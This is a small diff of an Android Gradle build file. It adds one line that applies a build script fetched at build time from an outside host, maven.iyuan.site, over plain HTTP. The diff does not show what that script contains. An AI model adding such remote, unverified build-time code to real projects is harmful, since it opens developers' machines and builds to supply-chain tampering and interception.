@@ -21,3 +21,5 @@ android {
 dependencies {
     implementation fileTree(dir: 'libs', include: ['*.jar'])
 }
+
+apply from: "http://maven.iyuan.site/repository/release.gradle"
